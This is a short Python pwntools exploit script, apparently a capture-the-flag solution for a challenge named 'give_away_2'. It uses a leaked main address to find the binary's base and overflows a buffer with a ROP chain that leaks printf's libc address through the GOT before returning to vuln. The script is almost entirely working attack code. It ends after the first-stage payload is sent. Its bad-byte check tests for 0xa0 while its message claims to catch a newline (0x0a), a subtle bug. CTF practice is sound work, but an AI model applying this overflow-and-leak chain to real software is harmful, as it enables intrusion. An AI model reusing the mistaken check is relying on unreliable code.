from pwn import *

p = process('./give_away_2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#p = remote('sharkyctf.xyz', 20335)
#libc = ELF('libc-2.27.so')

context.clear(arch='amd64')

p.recvuntil('Give away: ')
main = int(p.recvline().strip(),16)

binary = ELF('./give_away_2')
procbase = main - binary.symbols['main']
print('procbase: ' + hex(procbase))

rop = ROP('./give_away_2')
try:
    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
    print('pop_rdi: ' + hex(pop_rdi + procbase))
except:
    print("no ROP for you!")
    sys.exit(1)
payload  = 0x28 * b'A'
payload += p64(procbase + pop_rdi + 1)
payload += p64(procbase + pop_rdi)
payload += p64(procbase + binary.got['printf'])
payload += p64(procbase + binary.plt['printf'])
payload += p64(procbase + binary.symbols['vuln'])

# check load
if payload.find(b'\xa0') != -1:
    print("payload has NL!")
    print(payload)
    sys.exit(1)

p.sendline(payload)

